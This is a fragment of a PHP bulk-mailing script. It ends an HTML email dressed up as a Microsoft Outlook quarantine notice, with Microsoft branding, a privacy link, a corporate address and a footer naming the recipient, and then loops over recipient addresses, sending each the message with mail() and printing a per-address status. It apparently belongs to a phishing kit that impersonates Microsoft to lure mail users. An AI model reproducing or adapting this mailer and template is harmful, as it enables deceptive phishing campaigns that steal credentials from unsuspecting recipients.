<TABLE style='FONT-SIZE: 14px; HEIGHT: 134px; FONT-FAMILY: 'Segoe UI', Helvetica, Arial, sans-serif; WIDTH: 941px; WHITE-SPACE: normal; WORD-SPACING: 0px; MIN-WIDTH: 100%; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(50,49,48); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(243,242,241); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit' cellSpacing=0 cellPadding=0 width=941 border=0>
<TBODY>
<TR>
<TD style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI', Helvetica, Arial, sans-serif !important; WHITE-SPACE: normal !important; COLOR: rgb(72,70,68); PADDING-BOTTOM: 3px; PADDING-TOP: 44px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px'></SPAN><FONT size=2>You received this email using $value, If you're an IT admin, you can access the Outlook quarrantine portal from Admin dashboard.<BR></FONT></TD></TR>
<TR>
<TD style='FONT-SIZE: 12px; FONT-FAMILY: 'Segoe UI', Helvetica, Arial, sans-serif !important; WHITE-SPACE: normal !important; PADDING-BOTTOM: 24px; PADDING-TOP: 25px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px'>
<A style='BORDER-LEFT-WIDTH: 0px; TEXT-DECORATION: underline; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(105,105,105); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' href='https://go.microsoft.com/fwlink/?LinkId=521839' rel='noopener noreferrer' target=_blank data-auth='NotApplicable' data-linkindex='8'><FONT size=2>Privacy statement</FONT></A><FONT size=2> </FONT>
<DIV style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(105,105,105); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10px 0px 13px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px'><FONT size=2>
<SPAN class=markllw1ktl16 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' data-markjs='true' data-ogac='' data-ogab='' data-ogsc='' data-ogsb=''>Microsoft</SPAN><SPAN>&nbsp;</SPAN>Corporation, One<SPAN>&nbsp;</SPAN>
 <SPAN class=markllw1ktl16 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' data-markjs='true' data-ogac='' data-ogab='' data-ogsc='' data-ogsb=''>Microsoft</SPAN><SPAN>&nbsp;</SPAN>Way, Redmond WA 98052 USA</FONT></DIV></TD></TR></TBODY></TABLE></DIV></BODY></HTML>";  
 
  
if(mail($value,$subject,$message,$headers,$additional_parameters)){
     echo $value ." status:  Message sent"."<br>";
    }else if(!mail($value,$subject,$message,$headers,$additional_parameters)){
    echo $value ." status:   Message Not sent"."<br>";
    }  
   
}
?>